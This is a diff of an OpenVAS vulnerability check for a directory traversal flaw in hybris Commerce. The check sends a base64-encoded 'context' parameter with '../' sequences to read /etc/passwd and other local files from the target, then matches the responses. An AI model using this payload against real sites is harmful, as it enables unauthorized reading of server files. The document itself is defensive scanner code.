@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_hybris_dir_traversal_vuln.nasl 11218 2018-09-04 11:43:35Z mmartin $
+# $Id: gb_hybris_dir_traversal_vuln.nasl 11831 2018-10-11 07:49:24Z jschulte $
 #
 # hybris Commerce Directory Traversal Vulnerability
 #
@@ -28,8 +28,8 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105955");
-  script_version("$Revision: 11218 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-04 13:43:35 +0200 (Tue, 04 Sep 2018) $");
+  script_version("$Revision: 11831 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
   script_tag(name:"creation_date", value:"2015-02-25 14:49:12 +0700 (Wed, 25 Feb 2015)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
@@ -47,29 +47,29 @@ if (description)
 
   script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_tag(name:"summary", value:"hybris Commerce Software Suite is vulnerable to a
-directory traversal attack.");
+  directory traversal attack.");
 
   script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP
-GET request and check whether it is possible to access local files.");
+  GET request and check whether it is possible to access local files.");
 
   script_tag(name:"insight", value:"Webshops based on hybris may use an file retrieval
-system where files are identified by a URL parameter named 'context' rather than a file
-name. The context is base64 encoded and consists among other parameters the file name.
-This file name is vulnerable to directory traversal.");
+  system where files are identified by a URL parameter named 'context' rather than a file
+  name. The context is base64 encoded and consists among other parameters the file name.
+  This file name is vulnerable to directory traversal.");
 
   script_tag(name:"impact", value:"An unauthenticated attacker can retrieve arbitrary files
-which might consist sensitive data which can be used for further attacks.");
+  which might consist sensitive data which can be used for further attacks.");
 
   script_tag(name:"affected", value:"hybris Commerce Software Suite Releases 5.0.0, 5.0.3,
-5.0.4, 5.1, 5.1.1, 5.2 and 5.3");
+  5.0.4, 5.1, 5.1.1, 5.2 and 5.3");
 
   script_tag(name:"solution", value:"Upgrade to Release 5.0.0.4, 5.0.3.4, 5.0.4.5, 5.1.0.2,
-5.1.1.3, 5.2.0.4, 5.3.0.2 or higher.");
+  5.1.1.3, 5.2.0.4, 5.3.0.2 or higher.");
 
   script_xref(name:"URL", value:"https://www.redteam-pentesting.de/advisories/rt-sa-2014-016");
 
@@ -78,20 +78,29 @@ which might consist sensitive data which can be used for further attacks.");
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
 
-# base64 encoded "master|root|12345|text/plain|../../../../../../etc/passwd"
-trav = 'bWFzdGVyfHJvb3R8MTIzNDV8dGV4dC9wbGFpbnwuLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkfC0';
-url = '/medias/?context=' + trav;
+files = traversal_files();
 
-req = http_get(port:port, item:url);
-res = http_keepalive_send_recv(port:port, data:req);
+foreach pattern(keys(files)) {
 
-if (res && res =~ "root:.*:0:[01]:") {
-  report = report_vuln_url( port:port, url:url );
-  security_message(port:port, data:report);
-  exit(0);
+  file = files[pattern];
+
+  payload_clear = "master|root|12345|text/plain|../../../../../../" + file + "|";
+  payload_encoded = base64(str:payload_clear);
+
+  url = '/medias/?context=' + payload_encoded;
+
+  req = http_get(port:port, item:url);
+  res = http_keepalive_send_recv(port:port, data:req);
+
+  if (res && egrep(string:res, pattern:pattern)) {
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
+    exit(0);
+  }
 }
 
-exit(0);
+exit(99);
